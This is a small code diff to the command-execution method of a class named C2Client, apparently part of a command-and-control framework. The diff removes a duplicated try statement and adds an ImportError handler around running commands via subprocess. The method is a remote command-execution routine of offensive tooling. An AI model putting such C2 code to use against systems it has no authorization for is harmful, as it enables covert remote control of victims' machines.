@@ -433,7 +433,6 @@ class C2Client(BaseC2):
         import subprocess
         try:
             import shlex
-        try:
             # Parse command safely
             if isinstance(command, str):
                 cmd_args = shlex.split(command)
@@ -448,6 +447,9 @@ class C2Client(BaseC2):
                 timeout=30
             )
             return f"Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
+        except ImportError as e:
+            self.logger.error("Import error in c2_client.py: %s", e)
+            return f"Command execution failed: shlex import error"
         except subprocess.TimeoutExpired as e:
             self.logger.error("subprocess.TimeoutExpired in c2_client.py: %s", e)
             return "Command timed out after 30 seconds"
